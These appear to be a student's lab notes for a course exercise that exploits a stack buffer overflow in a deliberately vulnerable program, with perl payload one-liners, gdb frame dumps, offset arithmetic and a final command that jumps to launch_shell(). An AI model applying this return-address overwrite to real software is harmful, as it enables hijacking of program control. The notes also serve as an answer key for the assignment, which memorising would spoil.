@@ -1,0 +1,198 @@
+Jump to "SOLUTION" for solution and avoid all the mess inbetween.
+
+calculator: http://string-functions.com/decimal-binary.aspx
+perl -e 'print "A"x216' > INPUT
+
+0x55555555487e
+to
+"\x7e\x48\x55\x55\x55\x55"
+aka
+~HUUUU
+
+
+from exercise 1 concatenating multiple strings:
+"$(perl -e 'print "a"x102'; perl -e 'print "/bin/sh"')"
+
+
+
+./functions "$(perl -e 'print "A"x101'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x102'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x103'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x104'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x105'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x106'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "A"x107'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+./functions "$(perl -e 'print "%p"x108'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+
+
+
+Now i tried to overwrite the first 100 characters form buffer.
+Then i need to overwrite the frame pointer that is 8B long.
+finally, I can plug my converted return address ("\x7e\x48\x55\x55\x55\x55") that launches shell here.
+Meaning; overwrite first 108 bytes and then add your address..
+
+I get core dumped after trying to overwrite more than 106 bytes, so i will save input into INPUT variable, like thom did:
+perl -e 'print "A"x108' > INPUT
+
+INPUT=$(perl -e 'print "A"x108'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')
+not the same as
+INPUT1=$(perl -e 'print "A"x108')"\x7e\x48\x55\x55\x55\x55"
+
+./functions $INPUT
+./functions $INPUT1
+
+
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffda10:
+ rip = 0x7ffff7b5f956 in __strcpy_ssse3 (../sysdeps/x86_64/multiarch/strcpy-ssse3.S:43); saved rip = 0x555555554859
+ called by frame at 0x7fffffffdaa0
+ source language asm.
+ Arglist at 0x7fffffffda00, args: 
+ Locals at 0x7fffffffda00, Previous frame's sp is 0x7fffffffda10
+ Saved registers:
+  rip at 0x7fffffffda08
+(gdb) 
+
+
+this we need to overwrite: 0x555555554859
+
+In the check_passphrase func:
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffda10:
+ rip = 0x555555554859 in check_passphrase (functions.c:13); saved rip = 0x555555554921
+ called by frame at 0x7fffff005565
+ source language c.
+ Arglist at 0x7fffffffda00, args: passphrase=0x7fffffffdf22 'A' <repeats 108 times>, "~HUUUU"
+ Locals at 0x7fffffffda00, Previous frame's sp is 0x7fffffffda10
+ Saved registers:
+  rbp at 0x7fffffffda00, rip at 0x7fffffffda08
+
+Return addres is at 0x7fffffffda08
+
+We need to see how far is this from our buffer.
+
+(gdb) p &buffer
+$1 = (char (*)[100]) 0x7fffffffd990
+
+Using for calculating:
+https://www.calculator.net/hex-calculator.html?number1=7fffffffda08&c2op=-&number2=7fffffffd990&calctype=op&x=0&y=0
+
+7fffffffda08 - 7fffffffd990 = 120 (in decimal)
+New version is:
+7fffffffd998 - 7fffffffd990 = 8
+
+120 + 100 = 220
+
+
+BEFORE entering the func:
+
+(gdb) continue
+Continuing.
+* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~HUUUU
+* [DEBUG] The function launch_shell is at 0x55555555487e
+
+Breakpoint 9, check_passphrase (passphrase=0x7fffffffdf22 'A' <repeats 108 times>, "~HUUUU") at functions.c:12
+12	  strcpy(buffer, passphrase);
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffda10:
+ rip = 0x555555554846 in check_passphrase (functions.c:12); saved rip = 0x555555554921
+ called by frame at 0x7fffffffda30
+ source language c.
+ Arglist at 0x7fffffffda00, args: passphrase=0x7fffffffdf22 'A' <repeats 108 times>, "~HUUUU"
+ Locals at 0x7fffffffda00, Previous frame's sp is 0x7fffffffda10
+ Saved registers:
+  rbp at 0x7fffffffda00, rip at 0x7fffffffda08
+
+AFTER entering with s:
+
+(gdb) n
+13	  if(strcmp(passphrase, "the magic words are squeamish ossifrage") == 0)
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffda10:
+ rip = 0x555555554859 in check_passphrase (functions.c:13); saved rip = 0x555555554921
+ called by frame at 0x7fffff005565
+ source language c.
+ Arglist at 0x7fffffffda00, args: passphrase=0x7fffffffdf22 'A' <repeats 108 times>, "~HUUUU"
+ Locals at 0x7fffffffda00, Previous frame's sp is 0x7fffffffda10
+ Saved registers:
+  rbp at 0x7fffffffda00, rip at 0x7fffffffda08
+
+
+Now i have a new address of function to start_shell:
+0x56455d36187e
+7e18 365d 4556
+aka
+"\x7e\x18\x36\x5d\x45\x56"
+
+
+-----------------------
+
+return add:
+0x7fffffffd998
+0x7fffffffda08
+
+buff:
+0x7fffffffd990
+
+difference: 120
+
+therefore 100 + 120 = 220
+220 - 8 = 212 and i add my value aka return address of start_shell
+
+0x55555555487e
+"\x7e\x48\x55\x55\x55\x55"
+
+(gdb) start $(perl -e 'print "A"x120'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')
+
+____________________________
+ 
+
+SOLUTION 
+Jump here if and skip the mess above.
+Basically you just need the address where the return address is stored AFTER you are in the check_passphrase() func. 
+"info frame" and see the address of the rip
+
+then you check the address of the buffer with 
+"p &buffer"
+
+THIS ADDRESS IS AT THE BOTTOM OF THE STACK AND I SPENT SO MUCH TIME ON BC I THOUGHT IT's AT THE TOP.
+
+so after getting that difference, using: 	https://www.calculator.net/hex-calculator.html?number1=7fffffffda08&c2op=-&number2=7fffffffd990&calctype=op&x=87&y=26
+You get a decimal number of 120. That's in bytes. 
+
+You make your string that big with some dummy characters and then add address where launch_shell() is stored.
+
+"start $(perl -e 'print "A"x120'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')"
+
+That's it.
+I thought i need to add 100 bytes of buffer for some reason to the 120. I thought 120 is between the END (buffer[99]) of the 100B sized buffer and the return address.
+It turns out 120 CONTAINS 100B buffer and 20B offset for whatever reason i do not know but am happy to hear.
+I thought there's only frame pointer inbetween, 8B big. That's why i was originally trying with writing after 108B. 
+
+I don't now how i could do this without gdb and a fellow peer.
+Please tell me the secret tysm.
+
+-------------------------------------------
+final command:
+(gdb) run $(perl -e 'print "A"x120'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/jakob/Documents/fax2_2/HC/AS04/functions $(perl -e 'print "A"x120'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')
+* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~HUUUU
+* [DEBUG] The function launch_shell is at 0x55555555487e
+Launching shell.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffdaf8 in ?? ()
+(gdb)
+
+------------------------------------------
+or outside debugger:
+
+$ ./functions $(perl -e 'print "A"x120'; perl -e 'print "\x7e\x48\x55\x55\x55\x55"')
+* [DEBUG] Your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~HUUUU
+* [DEBUG] The function launch_shell is at 0x55555555487e
+Launching shell.
+Segmentation fault (core dumped)
+$ 
+
